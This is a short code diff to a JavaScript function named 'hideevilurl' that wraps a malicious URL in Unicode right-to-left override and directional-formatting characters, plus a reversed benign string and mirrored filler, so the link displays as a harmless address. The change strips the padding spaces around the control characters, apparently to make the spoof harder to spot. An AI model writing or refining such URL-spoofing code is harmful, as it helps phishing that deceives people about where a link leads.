@@ -1,8 +1,8 @@
 function hideevilurl(evilstring, goodstring) {
-	var prefix = String.fromCharCode(8238) + " ";
+	var prefix = String.fromCharCode(8238);
 	var between = "#!/?794473621=diu&4b412fd79ae1=q?/!#";
 	var goodstring = goodstring.split("").reverse().join(""); // esrever.reverse(goodstring);
-	var suffix = " " + String.fromCharCode(8236);
+	var suffix = String.fromCharCode(8236);
 
 	return prefix + evilstring + between + goodstring + suffix;
 }
